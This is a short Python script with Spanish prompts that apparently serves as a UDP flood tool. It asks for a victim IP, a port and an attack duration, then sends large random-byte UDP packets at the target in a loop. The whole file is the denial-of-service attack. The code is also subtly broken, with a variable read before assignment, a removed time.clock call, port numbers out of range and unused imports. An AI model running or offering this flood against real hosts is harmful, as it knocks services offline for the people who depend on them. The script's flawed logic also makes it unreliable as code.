import os
import time
import random
import socket
import requests
import threading
import cfscrape
import colorama
from colorama import *

def main():
        global victima
        global port
        global tiempo
        os.system("cls || clear")
        victima = input("- Victima: ")
        port = int(input("- Puerto: "))
        tiempo = int(input("- Tiempo De Ataque (Segundos): "))
        os.system("cls || clear")
        UDP()

def UDP():
    puertoo = port
    randport=(True,False)[port==0]
    ip = victima
    dur = tiempo
    tiempo=(lambda:0,time.clock)[dur>0]
    tiempotion=(1,(tiempo()+dur))[dur>0]
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(15000)
    os.system("cls || clear")
    print('- Empezando Ataque -')
    while True:
        puertoo=(random.randint(1,15000000),puertoo)[randport]
        if tiempo()<tiempotion:
            sock.sendto(bytes,(ip,puertoo))
        else:
            break
    os.system("cls || clear")
    print('Ataque Finalizado!')
    main()


if __name__ == "__main__":
	main()
